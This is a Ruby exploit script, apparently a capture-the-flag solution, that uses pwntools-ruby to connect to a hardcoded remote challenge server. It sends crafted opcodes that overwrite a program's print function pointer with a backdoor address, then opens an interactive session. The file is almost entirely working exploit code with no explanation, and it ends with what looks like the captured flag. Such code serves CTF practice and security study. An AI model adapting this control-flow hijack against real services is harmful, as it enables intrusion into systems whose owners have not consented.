#!/usr/bin/env ruby
# encoding: ascii-8bit
# frozen_string_literal: true

require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '110.10.147.111', 4141
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = ''
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def cp_slot_to_buf(slot)
  ((3 << 6) | slot).chr
end

def cp_buf_to_slot(slot, off)
  ((1 << 6) | slot).chr + off.chr
end

def append_zeros(n)
  fail if n >= 64
  ((2 << 6) | n).chr
end

data = p64(0x393130322394D3C0) + p64(0x1000) +
  cp_slot_to_buf(52) +
  cp_buf_to_slot(51, 1) + # file_size := print
  append_zeros((0x1320-0x1160) / 8) + # file_size += 0x1320 - 0x1160
  cp_slot_to_buf(51) +
  cp_buf_to_slot(52, 1) + # print := backdoor
  'a'
z.write data.size.p32
z.write data

z.interact
# YouNeedReallyGoodBugToBreakASLR!!
